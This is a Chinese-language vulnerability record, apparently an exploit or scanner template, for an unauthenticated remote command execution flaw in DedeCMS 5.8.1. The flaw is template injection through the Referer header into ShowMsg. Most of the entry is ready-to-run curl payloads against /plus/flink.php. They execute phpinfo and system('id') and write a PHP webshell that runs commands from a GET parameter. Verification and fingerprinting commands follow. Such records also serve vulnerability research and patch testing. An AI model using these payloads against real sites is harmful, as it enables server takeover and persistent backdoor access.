---
id: DEDECMS-5.8-SHOWMSG-RCE
title: DedeCMS 5.8.1 ShowMsg 模板注入远程命令执行漏洞
product: dedecms
vendor: DedeCMS
version_affected: "DedeCMS v5.8.1 beta"
severity: CRITICAL
tags: [rce, ssti, 无需认证, 国产]
fingerprint: ["DedeCMS", "织梦", "dedecms", "DedeCMS_V5"]
---

## 漏洞描述

DedeCMS v5.8.1 的 `common.func.php` 中 `ShowMsg()` 函数在处理错误提示时，直接将 HTTP Referer 头嵌入到模板代码中并交给模板引擎渲染。攻击者可构造包含 DedeCMS 模板标签的恶意 Referer，配合引号闭合绕过 `disable_functions`，实现远程命令执行。

## 影响版本

- DedeCMS v5.8.1 beta 内测版

## 前置条件

- 无需认证
- 默认安装配置

## 利用步骤

1. 向触发 ShowMsg 的接口发送请求
2. 在 Referer 头中注入 DedeCMS 模板标签
3. 模板引擎渲染时执行注入的 PHP 代码

## Payload

### 执行 phpinfo

```bash
curl -s "http://target/plus/flink.php?dopost=save" \
  -H "Referer: {dede:field.title if:phpinfo()=1/}"
```

### 执行系统命令

```bash
curl -s "http://target/plus/flink.php?dopost=save" \
  -H "Referer: {dede:field.title if:system('id')=1/}"
```

### 写入 webshell

```bash
curl -s "http://target/plus/flink.php?dopost=save" \
  -H "Referer: {dede:field.title if:file_put_contents('cmd.php','<?php system(\$_GET[c]);?>')=1/}"
```

## 验证方法

```bash
curl -s "http://target/plus/flink.php?dopost=save" \
  -H "Referer: {dede:field.title if:phpinfo()=1/}" | grep "phpinfo"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "DedeCMS\|织梦\|Powered by DedeCMSV5"
```
